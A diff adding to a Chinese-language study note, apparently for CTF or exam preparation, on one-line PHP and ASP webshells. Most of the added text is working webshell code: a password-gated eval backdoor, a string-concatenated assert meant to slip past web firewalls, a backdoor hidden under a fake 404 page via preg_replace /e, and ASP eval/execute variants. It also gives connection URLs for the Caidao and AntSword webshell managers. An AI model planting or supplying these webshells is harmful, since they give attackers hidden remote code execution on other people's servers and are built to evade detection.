@@ -29,6 +29,10 @@ $a(@$_POST['x']);
 ?>
 ```
 
+{% hint style="danger" %}
+通常x就是我们连接蚁剑或者菜刀的密码。
+{% endhint %}
+
 这段代码简化的关键语句是`eval(@$_POST['X'])和基本形态没有什么区别。这应该也算是最简单的免杀了。`
 
 #### 2)形态二
@@ -73,6 +77,131 @@ $c($_POST['x']);
 ?>
 ```
 
+### <mark style="color:purple;background-color:yellow;">②一句话木马的各种绕过</mark>
+
+#### 1）防爆破一句话
+
+```php
+<?php
+substr(md5($_POST['x']),28)=='6862'&&eval($_POST['123456']);
+
+?>
+```
+
+{% hint style="info" %}
+```
+菜刀地址http://192.168.**.***/x.php?x=myh0st
+```
+{% endhint %}
+
+这段代码的意思就是，接受一个变量x的值，然后对x的值进行md5加密（通常加密后的为32位），所以substr(string,offset)表示从x的28位开始要是6862（是从0，1，2，3，这样开始的到28），然后满足了才能进行eval()函数，所以就是防止了直接爆破password。（上述的6862是根据自己的x的md5确定的,比如题目中的是x=myh0st，myh0st通过md5加密后后四位是6862）
+
+#### 2）过狗的一句话
+
+```php
+<?php
+$a="a"."s"."s"."e"."r"."t";
+$a($_POST['123456']);
+?>
+```
+
+{% hint style="info" %}
+```
+菜刀地址http://192.168.**.***/x.php
+```
+{% endhint %}
+
+```php
+<?php
+($_=@$_GET['s']).@$_($_POST['hihack']);
+?>
+```
+
+{% hint style="info" %}
+```
+菜刀地址http://192.168.**.***/x.php?s=assert
+```
+{% endhint %}
+
+这些就是我们上面之前讲的简单一句话的变形的形态一样的道理。
+
+#### 3）不用问号？的一句话
+
+```javascript
+<script language="php">eval($_POST['123456']); </script>
+```
+
+相当于转化成为了js代码片段里面插入php代码。
+
+#### 4)躲避检测
+
+```php
+<?php
+@assert($_POST['123456']);
+?>
+```
+
+直接把eval变成了assert来执行emmm，怎么不算躲避呢
+
+#### 5)404隐藏一句话
+
+```html
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html>
+<head>
+<title>404 Not Found</title>
+</head>
+<body>
+<h1>Not Found</h1>
+<p>The requested URL /error.php was not found on this server. </p>
+</body>
+</html>
+<?php
+@preg_replace("/[checksql]/e",$_POST['hihack'],"saft");
+?>
+```
+
+这个解释一下，前面部分的html代码就是一个404常见页面的代码，不多讲了，重点讲一下后面的php代码
+
+> preg\_replace():是一个执行一个正则表达式的搜索和替换
+>
+> ```php
+> preg_replace( string|array $pattern,string|array $replacement,string|array $subject,
+>     int $limit = -1,int &$count = null): string|array|null
+> ```
+>
+> 第一个参数是模式串，第二个参数是替换的字符串，第三个是要进行替换的字符串。只不过第一个参数是一个正则表达式的模式串
+
+正则表达式中/e是指将替换串也就是replacement中的字符串当做代码来执行。
+
+{% hint style="info" %}
+`菜刀连接时在配置栏添加<O>date=@eval($_POST[paxmac]);</O>`
+{% endhint %}
+
+## <mark style="color:blue;background-color:green;">（2）ASP的一句话木马</mark>
+
+资料都很少，这个语法可以不用学，就连网上的资料我都觉得讲的有点不知所云，直接记就可以了。知道是以<%开头%>结尾就行。
+
+### <mark style="color:purple;background-color:yellow;">1）基本形态</mark>
+
+```vbnet
+<% eval request("123456")%>
+<%eval(request("123456")%>
+```
+
+```vbnet
+<% execute request("123456")%>
+<% execute(request("123456")%>
+```
+
+```vbnet
+<% executeglobal request("123456") %>
+<% executeglobal(request("123456")%>
+```
+
+其他的感觉都不知道重不重要，因为感觉都没有怎么用这个玩意了，等考了再补充吧。
+
+***
 
 
 
@@ -91,3 +220,15 @@ $c($_POST['x']);
 
 
 
+
+
+
+
+
+## 参考门
+
+[https://www.cnblogs.com/goodgad/p/13463866.html](https://www.cnblogs.com/goodgad/p/13463866.html)
+
+[https://www.anquanke.com/post/id/248627](https://www.anquanke.com/post/id/248627)
+
+[https://xz.aliyun.com/t/2356?time\_\_1311=n4%2BxnieDqWqxyAQD%2FWTASxmxmq7IeX55x\&alichlgref=https%3A%2F%2Fwww.google.com%2F](https://xz.aliyun.com/t/2356?time\_\_1311=n4%2BxnieDqWqxyAQD%2FWTASxmxmq7IeX55x\&alichlgref=https%3A%2F%2Fwww.google.com%2F)
